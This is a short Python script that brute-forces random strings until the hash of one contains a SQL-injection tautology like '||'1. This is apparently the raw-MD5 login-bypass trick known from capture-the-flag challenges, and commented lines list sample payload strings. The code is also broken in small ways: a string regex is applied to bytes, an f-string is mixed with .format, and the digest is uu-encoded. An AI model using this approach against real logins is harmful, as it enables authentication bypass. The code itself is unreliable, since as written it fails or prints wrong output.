from hashlib import md5
import os
import random
import re
import binascii
length = 10
val = 'foofoofoo'
out = 'bazbazbaz'
regex = ".*'\s*\|\|[\s-]*'\s*[1-9]"

letters = [ chr( x ) for x in range( 97, 123 ) ]
letters.extend( range( 10 ) );

# some tests...
##print 'None? %s' % re.search( regex, ' "  || 1 # ', re.I | re.S )
##print 'None? %s' % re.search( regex, " '  || 0 - ", re.I | re.S )
#print 'Match? %s' % re.search( regex, "'||  '4#'!@#$#%^ ", re.I | re.S )
## i don't know why you can have random dashes but it works
#print 'Match? %s' % re.search( regex, "jklol'|| - -'4# !@#$#%^ ", re.I | re.S )
#print 'Match? %s' % re.search( regex, " '  || ' 989  '!@#$#%^ ", re.I | re.S )
#print 'Match? %s' % re.search( regex, "'||'1", re.I | re.S )

count = 1
while count:
	if count%1000000==0:
		print(count)
	val = ''.join( str( random.choice( letters ) ) for l in range( length ) )
	out =  md5( val.encode() ).digest()
	out = binascii.b2a_uu(out)
	if re.search( regex, out, re.I | re.S ):
		print(f'md5 string:{0} and act {1}'.format(out,val))
		break
	count += 1
